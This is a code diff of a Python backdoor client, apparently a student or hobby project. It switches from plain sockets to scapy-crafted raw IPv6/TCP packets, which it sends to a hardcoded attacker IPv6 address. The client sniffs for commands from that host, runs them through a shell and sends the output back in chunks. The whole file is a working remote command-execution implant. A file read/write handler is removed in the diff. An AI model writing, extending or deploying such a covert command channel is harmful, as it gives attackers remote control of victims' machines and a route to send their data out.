@@ -1,94 +1,90 @@
 import socket
 import subprocess
 import os
+from scapy.all import *
+import time
 
-BUFFER_SIZE = 1024
-target_client = socket.socket(socket.AF_INET6, socket.SOCK_STREAM)
+
+attacker_hostname = "2409:4063:209d:520f:e84c:2b22:950a:35d0"
+attacker_port = 12345
 
 # connects with the attacker 
 def target_client_connector():
     # connect to the attacker
-    attacker_hostname = "2409:4063:2291:13d1:c421:695c:7d00:5173"
-    attacker_port = 1234
-    while(True):
-        success = target_client.connect_ex((attacker_hostname, attacker_port))
-        if(not success):
-            # connection established successfully
-            break
+    connect_command = "CONNECTION_FROM_CLIENT"
+    connector_packet = IPv6(dst=attacker_hostname)/TCP(sport= 12345, dport=attacker_port)/connect_command
+    send(connector_packet, verbose=0)
+    # while(True):
+    #     success = target_client.connect_ex((attacker_hostname, attacker_port))
+    #     if(not success):
+    #         # connection established successfully
+    #         break
 
 def send_data(data):
     # receive data from the attacker server
-    target_client.send(bytes(data, 'utf-8'))
+    contains_more_flag = False
+    while(len(data) > 0):
+        delimiter_index = -1
+        try: 
+            delimiter_index = data.index("***")
+            contains_more_flag = True
+        except:
+            contains_more_flag = False
+            pass
+        if(contains_more_flag):
+            to_send = data[0:delimiter_index]
+            data = data[delimiter_index:]
+            response_packet = IPv6(dst=attacker_hostname)/TCP(sport=12345, dport=attacker_port)/to_send
+            time.sleep(1) # to let the attacker side free up sniffing
+            send(response_packet, verbose=0)
+        else:
+            response_packet = IPv6(dst=attacker_hostname)/TCP(sport=12345, dport=attacker_port)/data
+            time.sleep(1) # to let the attacker side free up sniffing
+            send(response_packet, verbose=0)
+            break
+    response_packet = IPv6(dst=attacker_hostname)/TCP(sport=12345, dport=attacker_port)/"END_COMM"
+    time.sleep(1) # to let the attacker side free up sniffing
+    send(response_packet, verbose=0)
 
 def receive_data():
     # receive data from the attacker server
-    response = ""
+    command = ""
     while True:
-        received_data = target_client.recv(BUFFER_SIZE)
-        received_data = received_data.decode('utf-8')
-        response = response + str(received_data)
-        if(len(received_data) < BUFFER_SIZE):
-            break
-    print("Received: " + response)
-    # acknowledge receiving the data
-    send_data("ACK")
-
+        packet = sniff(count=1, filter="dst port 12345")
+        try:
+            extracted_packet = packet[0]['IPv6']
+            attacker_IP = extracted_packet.src
+            if(attacker_IP == attacker_hostname):
+                try:
+                    command = extracted_packet.load
+                    break
+                except:
+                    pass
+        except:
+            pass
     # do something on the data
-    
-    output = run_command(response)
+    output = run_command(command)
     try:
         output = output.decode('utf-8')
     except:
         pass
     # send result back
     send_data("\n" + output)
+    
+    
 
 def navigate_directory(command):
     destination_directory_path = command[command.index("cd") + 3:]
-    print(destination_directory_path)
     os.chdir(destination_directory_path)
 
-#   commands of the form:
-#   file    name_of_file   r/w/rw/a 
-#   do NOT create a file if it does not previously exist
-def file_handler(command):
-    command_splits = command.split(" ")
-    if(len(command_splits) > 3):
-        return "file command has more than two arguments."
-    
-    elif(command_splits[0] != 'file'):
-        return "incorrect command"
-    
-    file_name = command_splits[1]
-    mode = command_splits[2]
-
-    try:
-        file_object = open(file_name, mode)
-    except Exception as e:
-        return str(e)
-    
-
-    if(mode == 'r'):
-        data_read = file_object.read()
-        file_object.close()
-        return data_read
-    
-    elif(mode == 'w' or mode == 'a'):
-        response = ""
-        while True:
-            received_data = target_client.recv(BUFFER_SIZE)
-            received_data = received_data.decode('utf-8')
-            if(received_data == "FILE_UPDATE_QUIT"):
-                break
-            response = response + str(received_data) + "\n"
-        file_object.write(response)
-        file_object.close()
-        return "Data written successfully"
 
 def run_command(command):
 
     command = command.rstrip()
-
+    command = str(command)
+    first_apostrophe_index = command.index('\'')
+    command = command[first_apostrophe_index + 1:]
+    command = command[:len(command) - 1]
     try:
         command.index("cd")
         navigate_directory(command)
@@ -96,12 +92,6 @@ def run_command(command):
     except:
         pass
 
-    try:
-        command.index("file")
-        output = file_handler(command)
-        return output
-    except:
-        pass
     
     try:
         output = subprocess.check_output(command, stderr=subprocess.STDOUT, shell=True)
